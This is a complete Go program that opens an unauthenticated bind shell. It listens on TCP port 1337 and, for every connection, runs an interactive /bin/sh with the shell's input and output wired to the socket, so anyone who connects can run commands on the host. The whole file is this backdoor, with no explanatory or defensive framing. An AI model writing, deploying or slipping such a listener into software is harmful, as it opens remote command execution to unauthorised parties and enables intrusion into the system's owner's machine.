package main

import (
	"log"
	"net"
	"os/exec"
)

func handleClient(con net.Conn) {
	defer con.Close()

	sh := exec.Command("/bin/sh", "-i")
	sh.Stdin = con
	sh.Stdout = con
	sh.Stderr = con
	sh.Run()
}

func main() {
	srv, err := net.Listen("tcp", ":1337")
	if err != nil {
		log.Fatalln("Error:", err.Error())
	}

	log.Println("server listening")
	defer srv.Close()

	for {
		con, err := srv.Accept()
		if err != nil {
			log.Println("Error:", err.Error())
			continue
		}
		go handleClient(con)
	}
}
